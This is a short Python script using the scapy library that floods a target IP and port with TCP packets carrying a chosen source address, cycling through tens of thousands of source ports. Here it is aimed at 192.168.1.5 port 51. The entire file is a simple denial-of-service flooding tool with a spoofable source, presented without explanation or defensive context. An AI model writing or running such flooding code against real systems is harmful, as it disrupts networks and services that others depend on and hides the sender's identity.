#encoding: utf-8
from scapy.all import *

def flood(src, target_ip, target_port):
    for _port in range(1024, 65536):
        _ip_layer = IP(src=src, dst=target_ip)
        _tcp_layer = TCP(sport=_port, dport=target_port)
        send(_ip_layer / _tcp_layer)

if __name__ == '__main__':
    flood('localhost', '192.168.1.5', 51)
